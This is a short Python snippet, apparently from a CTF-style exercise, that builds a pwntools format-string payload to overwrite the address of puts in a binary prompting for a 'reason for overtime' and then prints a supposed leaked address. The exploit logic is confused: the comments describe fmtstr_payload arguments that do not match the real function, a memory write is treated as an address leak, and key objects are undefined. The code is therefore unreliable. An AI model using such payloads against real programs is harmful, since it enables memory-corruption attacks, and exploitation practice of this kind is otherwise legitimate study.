from pwnlib.fmtstr import fmtstr_payload

# To create a format string payload, we can use the fmtstr_payload() function from the pwnlib.fmtstr module. This function takes the following arguments:

# offset: the offset of the vulnerable parameter in the format string
# written: a dictionary that maps addresses to values to be written at those addresses
# bits: the number of bits in the target architecture (64 for x64, 32 for x86)
# align: the alignment of the written addresses (this is usually 1, unless the format string expects the arguments to be aligned)

# create a dictionary that maps the address of the puts() function to the value 0x123456
written = {elf.symbols['puts']: 0x123456}

# create the format string payload
payload = fmtstr_payload(offset=3, written=written, bits=64, align=1)

# send the payload as the reason for overtime
p.recvuntil('REASON FOR OVERTIME:')
p.sendline(payload)

# receive the output of the binary and extract the leaked address of the puts() function
output = p.recvuntil('REASON FOR OVERTIME:')
leaked_address = int(output.split()[-1], 16)

# print the leaked address
print(f'Leaked address of puts(): {hex(leaked_address)}')
